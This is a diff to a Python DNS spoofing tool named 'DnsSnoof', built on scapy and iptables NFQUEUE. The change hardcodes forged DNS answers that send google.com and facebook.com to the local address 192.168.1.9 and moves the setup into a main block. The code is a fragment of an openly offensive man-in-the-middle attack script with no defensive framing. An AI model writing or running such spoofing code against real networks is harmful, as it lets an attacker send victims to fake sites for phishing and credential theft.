@@ -23,11 +23,6 @@ class DnsSnoof:
 			log.info("[!] iptable rule flushed")
 
 	def callBack(self, packet):
-		if flg == 3 :
-			os.system(
-				f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
-			log.info("[!] iptable rule flushed")
-			exit()
 		scapyPacket = IP(packet.get_payload())
 		if scapyPacket.haslayer(DNSRR):
 			try:
@@ -50,15 +45,11 @@ class DnsSnoof:
 		return packet.accept()
 
 
-def dnsspoint(dnsIp,flgs):
-	global flg
-	global spoofIp
-	flg = flgs
-	spoofIp = dnsIp
+if __name__ == '__main__':
 	try:
 		hostDict = {
-			b"google.com.": spoofIp,
-			b"facebook.com.": spoofIp
+			b"google.com.": "192.168.1.9",
+			b"facebook.com.": "192.168.1.9"
 		}
 		queueNum = 1
 		log.basicConfig(format='%(asctime)s - %(message)s',
